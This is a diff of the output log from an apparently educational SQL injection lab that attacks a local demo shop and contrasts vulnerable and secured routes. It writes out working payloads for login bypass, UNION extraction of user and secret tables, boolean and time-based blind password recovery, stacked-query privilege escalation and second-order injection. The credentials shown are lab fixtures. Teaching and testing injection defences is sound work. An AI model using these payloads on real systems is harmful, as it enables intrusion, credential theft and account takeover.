@@ -1,142 +1,123 @@
 Running all SQL injection attacks against http://127.0.0.1:5000
 
 ======================================================================
-  ATTACK 1: Authentication bypass (login)
+  ATTACK 1: Authentication bypass (sign in)
 ======================================================================
-Goal   : log in as admin without knowing the password
-Payload: username = "admin'-- ", password = anything
-Idea   : the -- comments out the password check, so the query becomes
-         ...WHERE username = 'admin'--' AND password = '...'
+Goal   : sign in as the administrator without the password
+Payload: username = "ashis.chettri'-- ", password = anything
+Idea   : the -- comments out the password check, so the query ends at
+         ...WHERE username = 'ashis.chettri'
 ----------------------------------------------------------------------
-Vulnerable /login   -> Logged in as admin (role: admin)
-Secure /secure/login-> Invalid credentials
+Vulnerable /login   -> landed in the ADMIN DASHBOARD, every customer account visible
+Secure /secure/login-> rejected: Incorrect username or password
 
-Variant: username = "' OR '1'='1'-- " (always-true condition)
-Vulnerable /login   -> Logged in as admin (role: admin)
+Variant: username = "' OR 1=1-- " signs in as the first user too
+Vulnerable /login   -> signed in
 
 ======================================================================
-  ATTACK 2: Error based disclosure (login)
+  ATTACK 2: Error based disclosure (sign in)
 ======================================================================
-Goal   : make the database throw, and read the leaked error
-Payload: username = "'"
-Idea   : one stray quote breaks the SQL. A vulnerable app shows the raw
-         error, which hands the attacker the query shape.
+Goal   : make the database throw and read the leaked error
+Payload: username = "'"  (one stray quote)
+Idea   : the broken SQL error is shown to the user on a vulnerable
+         site, which reveals the query is built by concatenation.
 ----------------------------------------------------------------------
-Vulnerable /login   -> SQL error: unrecognized token: "x'"
-Secure /secure/login-> Invalid credentials
-
-Note: on MySQL or MSSQL the same error channel can be weaponised to pull
-      out real data using functions like extractvalue() or updatexml().
-      SQLite has no such function, so here the error is an information leak
-      that makes the UNION attack below much easier to build.
+Vulnerable /login   -> Database error: unrecognized token: &#34;x&#39;&#34;
+Secure /secure/login-> Incorrect username or password (no internal detail leaked)
 
 ======================================================================
-  ATTACK 3: UNION based data extraction (product and search)
+  ATTACK 3: UNION based data extraction (product listing)
 ======================================================================
-Step 1 : find the number of columns using ORDER BY
+Step 1 : find the column count with ORDER BY
 ----------------------------------------------------------------------
   ORDER BY 1: ok
   ORDER BY 2: ok
   ORDER BY 3: ok
   ORDER BY 4: ok
-  ORDER BY 5: ERROR -> too many columns
-  => the query returns 4 columns
+  ORDER BY 5: ERROR -> the query returns 4 columns
 
-Step 2 : UNION SELECT the users table into those 4 columns
+Step 2 : UNION SELECT every account into those four columns
 Payload: id = '0 UNION SELECT username, password, role, email FROM users'
 ----------------------------------------------------------------------
-Vulnerable /product -> stolen rows:
-    admin | S3cr3t_Admin!2026 | admin | admin@shop.bt
-    guest | guest | user | guest@shop.bt
-    pema | pema123 | user | pema@shop.bt
-    sonam | sonam456 | user | sonam@shop.bt
+Vulnerable /product -> stolen accounts:
+    ashis.chettri | Ch3ttri@CST!2026 | admin | ashis.chettri@norbu.bt
+    pema.dolker | Pema@2026 | user | pema.dolker@norbu.bt
+    sonam.wangmo | sonam456 | user | sonam.wangmo@norbu.bt
+    tashi.dorji | tashi789 | user | tashi.dorji@norbu.bt
 
-Step 3 : steal from a table the UI never shows (app_secrets)
-Payload: id = "0 UNION SELECT name, value, 'secret', 'x' FROM app_secrets"
+Step 3 : steal a table the store never shows (app_secrets)
+Payload: id = "0 UNION SELECT name, value, 'x', 'y' FROM app_secrets"
 ----------------------------------------------------------------------
-Vulnerable /product -> stolen secrets:
-    jwt_signing_secret | kuzuzangpo_la_super_secret
-    payment_api_key | sk_live_8fQ2zR_do_not_leak_this
+    db_backup_password | Norbu#Backup#2026
+    payment_gateway_key | pk_bt_7Qf2_internal_only
 
-Same UNION payload against the secure product route:
-Secure /secure/product-> Invalid product id
+Secure /secure/product-> Product not found (the id is validated, the payload is refused)
 
 ======================================================================
-  ATTACK 4: Boolean based blind (profile)
+  ATTACK 4: Boolean based blind (username checker)
 ======================================================================
-Goal   : the page only says exists / not found. Recover the admin
-         password one character at a time from that single bit.
-Idea   : ask 'is character N equal to X ?' as part of the WHERE.
-         'exists' means yes, 'not found' means no.
+Goal   : the checker only says 'taken' or 'available'. Recover the
+         administrator password one character at a time from that bit.
+Idea   : ask 'is character N of the password equal to X ?' in the WHERE.
 ----------------------------------------------------------------------
-  position  1: 'S'   recovered so far: S
-  position  2: '3'   recovered so far: S3
-  position  3: 'c'   recovered so far: S3c
-  position  4: 'r'   recovered so far: S3cr
-  position  5: '3'   recovered so far: S3cr3
-  position  6: 't'   recovered so far: S3cr3t
-  position  7: '_'   recovered so far: S3cr3t_
-  position  8: 'A'   recovered so far: S3cr3t_A
-  position  9: 'd'   recovered so far: S3cr3t_Ad
-  position 10: 'm'   recovered so far: S3cr3t_Adm
-  position 11: 'i'   recovered so far: S3cr3t_Admi
-  position 12: 'n'   recovered so far: S3cr3t_Admin
-  position 13: '!'   recovered so far: S3cr3t_Admin!
-  position 14: '2'   recovered so far: S3cr3t_Admin!2
-  position 15: '0'   recovered so far: S3cr3t_Admin!20
-  position 16: '2'   recovered so far: S3cr3t_Admin!202
-  position 17: '6'   recovered so far: S3cr3t_Admin!2026
+  position  1: 'C'   recovered so far: C
+  position  2: 'h'   recovered so far: Ch
+  position  3: '3'   recovered so far: Ch3
+  position  4: 't'   recovered so far: Ch3t
+  position  5: 't'   recovered so far: Ch3tt
+  position  6: 'r'   recovered so far: Ch3ttr
+  position  7: 'i'   recovered so far: Ch3ttri
+  position  8: '@'   recovered so far: Ch3ttri@
+  position  9: 'C'   recovered so far: Ch3ttri@C
+  position 10: 'S'   recovered so far: Ch3ttri@CS
+  position 11: 'T'   recovered so far: Ch3ttri@CST
+  position 12: '!'   recovered so far: Ch3ttri@CST!
+  position 13: '2'   recovered so far: Ch3ttri@CST!2
+  position 14: '0'   recovered so far: Ch3ttri@CST!20
+  position 15: '2'   recovered so far: Ch3ttri@CST!202
+  position 16: '6'   recovered so far: Ch3ttri@CST!2026
 
-Recovered admin password (blind): S3cr3t_Admin!2026
+Recovered administrator password (blind): Ch3ttri@CST!2026
 
-Same technique against the secure profile route:
-Secure /secure/profile-> No such user (the whole string is treated as a username, so it never matches)
+Secure /secure/check-username-> always 'available', the payload is one literal username
 
 ======================================================================
-  ATTACK 5: Time based blind (profile)
+  ATTACK 5: Time based blind (username checker)
 ======================================================================
-Goal   : same as blind, but when the page gives NO visible
-         difference at all. We make a true answer run slowly and
-         read the answer off the clock.
-Idea   : CASE WHEN (guess is right) THEN <heavy query> ELSE 0 END
+Goal   : same as blind, but read the answer off the clock when there
+         is no visible difference. A correct guess runs slowly.
 ----------------------------------------------------------------------
-  position 1: 'S' took 1.55s  -> TRUE
-  position 2: '3' took 1.98s  -> TRUE
-  position 3: 'c' took 1.64s  -> TRUE
-  position 4: 'r' took 1.78s  -> TRUE
+  position 1: 'C' ran slowly -> TRUE
+  position 2: 'h' ran slowly -> TRUE
+  position 3: '3' ran slowly -> TRUE
+  position 4: 't' ran slowly -> TRUE
 
-Recovered first characters by timing only: S3cr
-
-Secure route: the payload is bound as data, the heavy branch never
-runs, so the response time stays flat no matter what we guess.
-Secure /secure/profile responded in 0.00s
+Recovered first characters by timing only: Ch3t
+Secure route responded in 0.00s (flat, no timing leak)
 
 ======================================================================
-  ATTACK 6: Stacked queries (track)
+  ATTACK 6: Stacked queries (view counter)
 ======================================================================
-Goal   : run a second, attacker chosen statement after a semicolon.
-         Here: silently promote the guest account to admin.
+Goal   : append a second statement after a semicolon. Here, promote
+         a normal account to administrator.
 ----------------------------------------------------------------------
-Guest role before: user
-Payload: id = "1; UPDATE users SET role='admin' WHERE username='guest'"
-Guest role after : admin   <-- privilege escalation
+tashi.dorji role before: user
+Payload: id = "1; UPDATE users SET role='admin' WHERE username='tashi.dorji'"
+tashi.dorji role after : admin   <-- privilege escalation
 
-Same payload against the secure track route:
-Guest role now   : admin (secure route rejected the non numeric id, so no change from it)
+Secure /secure/track-> rejected the non numeric id, no change
 
 ======================================================================
-  ATTACK 7: Second order injection (register then reset)
+  ATTACK 7: Second order injection (register, then reset)
 ======================================================================
-Goal   : take over the admin account. The injection is STORED during
-         registration (safely) and only fires later during reset.
+Goal   : take over the administrator account. The payload is STORED
+         during registration and only fires later, during reset.
 ----------------------------------------------------------------------
-Admin password before: S3cr3t_Admin!2026
-Step 1: register username = "admin'-- " (stored safely)
-        -> Registered username: admin'-- 
-Step 2: reset password while logged in as that account
-        query that ran: UPDATE users SET password = 'pwned_by_second_order' WHERE username = 'admin'-- '
-Admin password after : pwned_by_second_order   <-- admin account taken over
+Admin password before: Ch3ttri@CST!2026
+Step 1: register username = "ashis.chettri'-- " (stored safely, no error)
+Step 2: trigger a password reset as that stored account
+        query that ran: UPDATE users SET password = 'pwned_2nd_order' WHERE username = 'ashis.chettri'-- '
+Admin password after : pwned_2nd_order   <-- administrator account taken over
 
 ----------------------------------------------------------------------
-Done. Restart the server (python3 app.py) to reset the database
-before running again.
+Done. Restart the server (python3 app.py) to reset the database.
